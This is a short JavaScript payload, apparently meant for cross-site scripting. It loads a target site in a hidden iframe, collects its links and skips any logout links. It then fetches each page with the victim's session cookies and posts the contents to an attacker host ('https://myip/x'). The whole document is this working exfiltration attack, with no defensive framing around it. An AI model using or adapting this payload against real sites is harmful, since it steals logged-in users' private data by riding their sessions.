
source = "https://myip"

function getContent() {
    allA = iframe.contentDocument.getElementsByTagName("a");
    allHrefs = [];
    for (var i=0; i<allA.length; i++){
        allHrefs.push(allA[i].href);
    }
    uniqueHrefs = _.unique(allHrefs);

    validUniqueHrefs = [];
    for(var i=0; i<uniqueHrefs.length; i++) {
        if (validURL(uniqueHrefs[i]))
            validUniqueHrefs.push(uniqueHrefs[i]);
    }

    // async task
    validUniqueHrefs.forEach(href => {
        fetch(href, {
            "credentials": 'include',
            "method": "get",
        })
        .then((response) => {
            return response.text();
        })
        .then(function (text) {
        	// send contents back
            fetch(source + "/x", {
                method: "POST",
                headers: {
                    "content-Type": "application/json"
                },
                body: JSON.stringify({
                    url: href,
                    content: text
                })
            });
        });
    });
}

function validURL(s) {
    // exercise here
    blackList = ["logout", "log-out", "signout", "sign-out"];
    for(var i=0; i<blackList.length; i++) {
        if (s.toLowerCase().indexOf(blackList[i]) > -1)
            return false;
    }
    return true;
}

function actions(){
    setTimeout(function(){ getContent() }, 5000);
}

var iframe = document.createElement('iframe');
iframe.setAttribute("style", "display:none");
iframe.onload = actions;;
iframe.width = "100%";
iframe.height = "100%";
iframe.src = "http://<target>";

body = document.getElementsByTagName('body')[0]; 
body.appendChild(iframe);